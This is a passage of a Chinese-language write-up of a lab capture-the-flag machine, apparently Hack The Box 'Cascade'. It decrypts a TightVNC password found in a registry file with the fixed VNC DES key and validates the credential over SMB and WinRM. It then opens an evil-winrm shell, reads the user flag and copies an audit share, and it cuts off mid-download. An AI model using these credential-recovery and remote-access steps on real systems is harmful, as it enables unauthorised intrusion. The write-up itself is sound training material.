+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Directory Server Diagnosis
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Performing initial setup:
+</span></span><span style="display:flex;"><span>   Trying to find home server...
+</span></span><span style="display:flex;"><span>   Home Server <span style="color:#f92672">=</span> CASC-DC1
+</span></span><span style="display:flex;"><span>   * Identified AD Forest. 
+</span></span><span style="display:flex;"><span>   Done gathering initial info.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Doing initial required tests
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Testing server: Default-First-Site-Name<span style="color:#ae81ff">\C</span>ASC-DC1
+</span></span><span style="display:flex;"><span>      Starting test: Connectivity
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test Connectivity
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Doing primary tests
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Testing server: Default-First-Site-Name<span style="color:#ae81ff">\C</span>ASC-DC1
+</span></span><span style="display:flex;"><span>      Starting test: Advertising
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test Advertising
+</span></span><span style="display:flex;"><span>      Starting test: FrsEvent
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test FrsEvent
+</span></span><span style="display:flex;"><span>      Starting test: DFSREvent
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test DFSREvent
+</span></span><span style="display:flex;"><span>      Starting test: SysVolCheck
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test SysVolCheck
+</span></span><span style="display:flex;"><span>      Starting test: KccEvent
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test KccEvent
+</span></span><span style="display:flex;"><span>      Starting test: KnowsOfRoleHolders
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test KnowsOfRoleHolders
+</span></span><span style="display:flex;"><span>      Starting test: MachineAccount
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test MachineAccount
+</span></span><span style="display:flex;"><span>      Starting test: NCSecDesc
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test NCSecDesc
+</span></span><span style="display:flex;"><span>      Starting test: NetLogons
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test NetLogons
+</span></span><span style="display:flex;"><span>      Starting test: ObjectsReplicated
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test ObjectsReplicated
+</span></span><span style="display:flex;"><span>      Starting test: Replications
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test Replications
+</span></span><span style="display:flex;"><span>      Starting test: RidManager
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test RidManager
+</span></span><span style="display:flex;"><span>      Starting test: Services
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test Services
+</span></span><span style="display:flex;"><span>      Starting test: SystemLog
+</span></span><span style="display:flex;"><span>         A warning event occurred.  EventID: 0x8000001D
+</span></span><span style="display:flex;"><span>            Time Generated: 01/10/2020   15:48:14
+</span></span><span style="display:flex;"><span>            Event String:
+</span></span><span style="display:flex;"><span>            The Key Distribution Center <span style="color:#f92672">(</span>KDC<span style="color:#f92672">)</span> cannot find a suitable certificate to use <span style="color:#66d9ef">for</span> smart card logons, or the KDC certificate could not be verified. Smart card logon may not <span style="color:#66d9ef">function</span> correctly <span style="color:#66d9ef">if</span> this problem is not resolved. To correct this problem, either verify the existing KDC certificate using certutil.exe or enroll <span style="color:#66d9ef">for</span> a new KDC certificate.
+</span></span><span style="display:flex;"><span>         An error event occurred.  EventID: 0xC00038D6
+</span></span><span style="display:flex;"><span>            Time Generated: 01/10/2020   15:48:43
+</span></span><span style="display:flex;"><span>            Event String:
+</span></span><span style="display:flex;"><span>            The DFS Namespace service could not initialize cross forest trust information on this domain controller, but it will periodically retry the operation. The <span style="color:#66d9ef">return</span> code is in the record data.
+</span></span><span style="display:flex;"><span>         A warning event occurred.  EventID: 0x000003F6
+</span></span><span style="display:flex;"><span>            Time Generated: 01/10/2020   15:48:43
+</span></span><span style="display:flex;"><span>            Event String:
+</span></span><span style="display:flex;"><span>            Name resolution <span style="color:#66d9ef">for</span> the name _ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.cascade.local timed out after none of the configured DNS servers responded.
+</span></span><span style="display:flex;"><span>         A warning event occurred.  EventID: 0x0000000C
+</span></span><span style="display:flex;"><span>            Time Generated: 01/10/2020   15:48:43
+</span></span><span style="display:flex;"><span>            Event String:
+</span></span><span style="display:flex;"><span>            Time Provider NtpClient: This machine is configured to use the domain hierarchy to determine its time source, but it is the AD PDC emulator <span style="color:#66d9ef">for</span> the domain at the root of the forest, so there is no machine above it in the domain hierarchy to use as a time source. It is recommended that you either configure a reliable time service in the root domain, or manually configure the AD PDC to synchronize with an external time source. Otherwise, this machine will <span style="color:#66d9ef">function</span> as the authoritative time source in the domain hierarchy. If an external time source is not configured or used <span style="color:#66d9ef">for</span> this computer, you may choose to disable the NtpClient.
+</span></span><span style="display:flex;"><span>         A warning event occurred.  EventID: 0x000727AA
+</span></span><span style="display:flex;"><span>            Time Generated: 01/10/2020   15:50:52
+</span></span><span style="display:flex;"><span>            Event String:
+</span></span><span style="display:flex;"><span>            The WinRM service failed to create the following SPNs: WSMAN/CASC-DC1.cascade.local; WSMAN/CASC-DC1. 
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 failed test SystemLog
+</span></span><span style="display:flex;"><span>      Starting test: VerifyReferences
+</span></span><span style="display:flex;"><span>         ......................... CASC-DC1 passed test VerifyReferences
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Running partition tests on : ForestDnsZones
+</span></span><span style="display:flex;"><span>      Starting test: CheckSDRefDom
+</span></span><span style="display:flex;"><span>         ......................... ForestDnsZones passed test CheckSDRefDom
+</span></span><span style="display:flex;"><span>      Starting test: CrossRefValidation
+</span></span><span style="display:flex;"><span>         ......................... ForestDnsZones passed test
+</span></span><span style="display:flex;"><span>         CrossRefValidation
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Running partition tests on : DomainDnsZones
+</span></span><span style="display:flex;"><span>      Starting test: CheckSDRefDom
+</span></span><span style="display:flex;"><span>         ......................... DomainDnsZones passed test CheckSDRefDom
+</span></span><span style="display:flex;"><span>      Starting test: CrossRefValidation
+</span></span><span style="display:flex;"><span>         ......................... DomainDnsZones passed test
+</span></span><span style="display:flex;"><span>         CrossRefValidation
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Running partition tests on : Schema
+</span></span><span style="display:flex;"><span>      Starting test: CheckSDRefDom
+</span></span><span style="display:flex;"><span>         ......................... Schema passed test CheckSDRefDom
+</span></span><span style="display:flex;"><span>      Starting test: CrossRefValidation
+</span></span><span style="display:flex;"><span>         ......................... Schema passed test CrossRefValidation
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Running partition tests on : Configuration
+</span></span><span style="display:flex;"><span>      Starting test: CheckSDRefDom
+</span></span><span style="display:flex;"><span>         ......................... Configuration passed test CheckSDRefDom
+</span></span><span style="display:flex;"><span>      Starting test: CrossRefValidation
+</span></span><span style="display:flex;"><span>         ......................... Configuration passed test CrossRefValidation
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Running partition tests on : cascade
+</span></span><span style="display:flex;"><span>      Starting test: CheckSDRefDom
+</span></span><span style="display:flex;"><span>         ......................... cascade passed test CheckSDRefDom
+</span></span><span style="display:flex;"><span>      Starting test: CrossRefValidation
+</span></span><span style="display:flex;"><span>         ......................... cascade passed test CrossRefValidation
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   Running enterprise tests on : cascade.local
+</span></span><span style="display:flex;"><span>      Starting test: LocatorCheck
+</span></span><span style="display:flex;"><span>         ......................... cascade.local passed test LocatorCheck
+</span></span><span style="display:flex;"><span>      Starting test: Intersite
+</span></span><span style="display:flex;"><span>         ......................... cascade.local passed test Intersite
+</span></span></code></pre></div><p>有一个有价值的信息 &ldquo;Password&rdquo;=hex:6b,cf,2a,4b,6e,5a,ca,0f。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat IT/Temp/s.smith/VNC<span style="color:#ae81ff">\ </span>Install.reg 
+</span></span><span style="display:flex;"><span>��Windows Registry Editor Version 5.00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\T</span>ightVNC<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\T</span>ightVNC<span style="color:#ae81ff">\S</span>erver<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;ExtraPorts&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;QueryTimeout&#34;</span><span style="color:#f92672">=</span>dword:0000001e
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;QueryAcceptOnTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;LocalInputPriorityTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000003
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;LocalInputPriority&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;BlockRemoteInput&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;BlockLocalInput&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;IpAccessControl&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;RfbPort&#34;</span><span style="color:#f92672">=</span>dword:0000170c
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;HttpPort&#34;</span><span style="color:#f92672">=</span>dword:000016a8
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;DisconnectAction&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;AcceptRfbConnections&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;UseVncAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;UseControlAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;RepeatControlAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;LoopbackOnly&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;AcceptHttpConnections&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;LogLevel&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;EnableFileTransfers&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;RemoveWallpaper&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;UseD3D&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;UseMirrorDriver&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;EnableUrlParams&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;AlwaysShared&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;NeverShared&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;DisconnectClients&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;PollingInterval&#34;</span><span style="color:#f92672">=</span>dword:000003e8
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;AllowLoopback&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;VideoRecognitionInterval&#34;</span><span style="color:#f92672">=</span>dword:00000bb8
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;GrabTransparentWindows&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;SaveLogToAllUsersPath&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;RunControlInterface&#34;</span><span style="color:#f92672">=</span>dword:00000001
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;IdleTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000000
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;VideoClasses&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;VideoRects&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><p>解码得到一个凭据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#39;6bcf2a4b6e5aca0f&#39;</span> | xxd -r -p | openssl enc -d -des-ecb -K E84AD660C4721AE0 -nopad      
+</span></span><span style="display:flex;"><span>sT333ve2
+</span></span></code></pre></div><p>保存下来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Users<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim s.smith 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Users<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat s.smith   
+</span></span><span style="display:flex;"><span>s.smith:sT333ve2
+</span></span></code></pre></div><p>s.smith 有 winrm 权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.26.199 -u <span style="color:#e6db74">&#39;s.smith&#39;</span> -p <span style="color:#e6db74">&#39;sT333ve2&#39;</span>   
+</span></span><span style="display:flex;"><span>SMB         10.129.26.199   <span style="color:#ae81ff">445</span>    CASC-DC1         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:CASC-DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cascade.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.26.199   <span style="color:#ae81ff">445</span>    CASC-DC1         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cascade.local<span style="color:#ae81ff">\s</span>.smith:sT333ve2 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm 10.129.26.199 -u <span style="color:#e6db74">&#39;s.smith&#39;</span> -p <span style="color:#e6db74">&#39;sT333ve2&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.26.199   <span style="color:#ae81ff">5985</span>   CASC-DC1         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> <span style="color:#f92672">(</span>name:CASC-DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cascade.local<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.26.199   <span style="color:#ae81ff">5985</span>   CASC-DC1         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cascade.local<span style="color:#ae81ff">\s</span>.smith:sT333ve2 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>登录拿到 user flag。</p>
+<h2 id="提权">提权</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i cascade.local -u s.smith -p <span style="color:#e6db74">&#39;sT333ve2&#39;</span>                                    
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>cascade<span style="color:#ae81ff">\s</span>.smith
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>ff05e4a32d956057e15f2574f49757ff
+</span></span></code></pre></div><p>枚举得到信息：s.smith 登录时会执行脚本 MapAuditDrive.vbs。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\i</span>netpub&gt; net user s.smith
+</span></span><span style="display:flex;"><span>User name                    s.smith
+</span></span><span style="display:flex;"><span>Full Name                    Steve Smith
+</span></span><span style="display:flex;"><span>Comment
+</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
+</span></span><span style="display:flex;"><span>Country code                 <span style="color:#ae81ff">000</span> <span style="color:#f92672">(</span>System Default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Account active               Yes
+</span></span><span style="display:flex;"><span>Account expires              Never
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Password last set            1/28/2020 8:58:05 PM
+</span></span><span style="display:flex;"><span>Password expires             Never
+</span></span><span style="display:flex;"><span>Password changeable          1/28/2020 8:58:05 PM
+</span></span><span style="display:flex;"><span>Password required            Yes
+</span></span><span style="display:flex;"><span>User may change password     No
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Workstations allowed         All
+</span></span><span style="display:flex;"><span>Logon script                 MapAuditDrive.vbs
+</span></span><span style="display:flex;"><span>User profile
+</span></span><span style="display:flex;"><span>Home directory
+</span></span><span style="display:flex;"><span>Last logon                   1/29/2020 12:26:39 AM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Logon hours allowed          All
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local Group Memberships      *Audit Share          *IT
+</span></span><span style="display:flex;"><span>                             *Remote Management Use
+</span></span><span style="display:flex;"><span>Global Group memberships     *Domain Users
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span></code></pre></div><p>看看这个脚本里有什么。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\i</span>netpub&gt; type <span style="color:#ae81ff">\\</span>casc-dc1<span style="color:#ae81ff">\N</span>ETLOGON<span style="color:#ae81ff">\M</span>apAuditDrive.vbs
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span>MapAuditDrive.vbs
+</span></span><span style="display:flex;"><span>Option Explicit
+</span></span><span style="display:flex;"><span>Dim oNetwork, strDriveLetter, strRemotePath
+</span></span><span style="display:flex;"><span>strDriveLetter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;F:&#34;</span>
+</span></span><span style="display:flex;"><span>strRemotePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\\CASC-DC1\Audit</span>$<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>Set oNetwork <span style="color:#f92672">=</span> CreateObject<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WScript.Network&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
+</span></span><span style="display:flex;"><span>WScript.Quit
+</span></span></code></pre></div><p>查看这个远程地址得到一个数据库信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\i</span>netpub&gt; dir <span style="color:#ae81ff">\\</span>CASC-DC1<span style="color:#ae81ff">\A</span>udit$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: <span style="color:#ae81ff">\\</span>CASC-DC1<span style="color:#ae81ff">\A</span>udit$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----        1/28/2020   9:40 PM                DB
+</span></span><span style="display:flex;"><span>d-----        1/26/2020  10:25 PM                x64
+</span></span><span style="display:flex;"><span>d-----        1/26/2020  10:25 PM                x86
+</span></span><span style="display:flex;"><span>-a----        1/28/2020   9:46 PM          <span style="color:#ae81ff">13312</span> CascAudit.exe
+</span></span><span style="display:flex;"><span>-a----        1/29/2020   6:00 PM          <span style="color:#ae81ff">12288</span> CascCrypto.dll
+</span></span><span style="display:flex;"><span>-a----        1/28/2020  11:29 PM             <span style="color:#ae81ff">45</span> RunAudit.bat
+</span></span><span style="display:flex;"><span>-a----       10/27/2019   6:38 AM         <span style="color:#ae81ff">363520</span> System.Data.SQLite.dll
+</span></span><span style="display:flex;"><span>-a----       10/27/2019   6:38 AM         <span style="color:#ae81ff">186880</span> System.Data.SQLite.EF6.dll
+</span></span></code></pre></div><p>查看 RunAudit.bat，里面经常存放敏感信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\i</span>netpub&gt; type <span style="color:#ae81ff">\\</span>CASC-DC1<span style="color:#ae81ff">\A</span>udit$<span style="color:#ae81ff">\R</span>unAudit.bat
+</span></span><span style="display:flex;"><span>CascAudit.exe <span style="color:#e6db74">&#34;\\CASC-DC1\Audit</span>$<span style="color:#e6db74">\DB\Audit.db&#34;</span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\i</span>netpub&gt; dir <span style="color:#ae81ff">\\</span>CASC-DC1<span style="color:#ae81ff">\A</span>udit$<span style="color:#ae81ff">\D</span>B
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: <span style="color:#ae81ff">\\</span>CASC-DC1<span style="color:#ae81ff">\A</span>udit$<span style="color:#ae81ff">\D</span>B
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        1/28/2020   9:39 PM          <span style="color:#ae81ff">24576</span> Audit.db
+</span></span></code></pre></div><p>将这个文件夹拿到 kali 本地。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ mkdir -p ~/Work/Kali/Cascade/Audit <span style="color:#f92672">&amp;&amp;</span> cd ~/Work/Kali/Cascade/Audit
+</span></span><span style="display:flex;"><span>  smbclient //10.129.26.199/Audit<span style="color:#ae81ff">\$</span> -U <span style="color:#e6db74">&#39;s.smith%sT333ve2&#39;</span> -W cascade.local <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -c <span style="color:#e6db74">&#39;prompt OFF; recurse ON; mget *&#39;</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\C</span>ascAudit.exe of size <span style="color:#ae81ff">13312</span> as CascAudit.exe <span style="color:#f92672">(</span>21.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 21.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\C</span>ascCrypto.dll of size <span style="color:#ae81ff">12288</span> as CascCrypto.dll <span style="color:#f92672">(</span>23.8 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 22.3 KiloBytes/sec<span style="color:#f92672">)</span>
